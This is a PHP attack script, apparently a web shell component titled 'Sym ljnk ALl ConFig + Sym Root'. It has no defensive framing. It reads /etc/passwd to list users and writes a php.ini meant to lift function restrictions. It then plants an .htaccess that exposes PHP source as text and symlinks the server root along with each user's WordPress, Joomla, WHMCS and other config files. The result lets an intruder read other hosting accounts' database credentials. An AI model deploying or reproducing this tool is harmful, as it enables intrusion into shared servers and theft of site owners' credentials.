<?php


 $head = '
<html>
<head>
</script>
<title>--==[[Sym ljnk ALl ConFig + Sym Root by Kym Ljnk]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: dashed 1px;
border-color		: #333;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border			: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>'; ?>
<html>
	<head>
		<?php 
		echo $head ;
		echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="100%" align=center valign="top" rowspan="1">
           <font color=red size=5 face="comic sans ms"><b>--==[[ Sym ljnk ALl ConFig</font><font color=white size=5 face="comic sans ms"><b>   + Sym Root </font><font color=green size=5 face="comic sans ms"><b> Team by Kym Ljnk ]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        					
           </table>
        

'; 

?>
<center>
<form method=post><font color=white size=2 face="comic sans ms">1. Creat php.ini file</font><p>
<input type=submit name=ini value="use to Generate PHP.ini" /></form>
<form method=post><font color=white size=2 face="comic sans ms">2. Get usernames for symlink</font><p>
	<input type=submit name="usre" value="use to Extract usernames" /></form>
	
	<?php
	if(isset($_POST['ini']))
	{
		
		$r=fopen('php.ini','w');
		$rr=" disbale_functions=none ";
		fwrite($r,$rr);
		$link="<a href=php.ini><font color=white size=2 face=\"comic sans ms\"><u>open PHP.INI</u></font></a>";
		echo $link;	
		}
	?>
	<?php
	if(isset($_POST['usre'])){
		?><form method=post>
	<textarea rows=10 cols=50 name=user><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
	<input type=submit name=su value="Lets Start" /></form>
	<?php } ?>
	<?php
	error_reporting(0);
	echo "<font color=red size=2 face=\"comic sans ms\">";
	if(isset($_POST['su']))
	{
	mkdir('sym',0777);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$g = fopen('sym/.htaccess','w');
fwrite($g,$rr);
$Sym = symlink("/","sym/root");
		    $rt="<a href=sym/root><font color=white size=3 face=\"comic sans ms\"> Sym</font></a>";
        echo "Root / folder symlink <br><u>$rt</u>";
		
		$dir=mkdir('sym',0777);
		$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
        $f = fopen('sym/.htaccess','w');
   
        fwrite($f,$r);
        $consym="<a href=sym/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
       	echo "<br>Sym Ljnk All ConFig <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
       	
       		$usr=explode("\n",$_POST['user']);
       	$configuration=array("wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php");
		foreach($usr as $uss )
		{
			$us=trim($uss);
						
			foreach($configuration as $c)
			{
			 $rs="/home/".$us."/public_html/".$c;
			 $r="sym/".$us." .. ".$c;
			 symlink($rs,$r);
			
		}
			
			}
		
		
		}
	
	
	
	?>
</center>	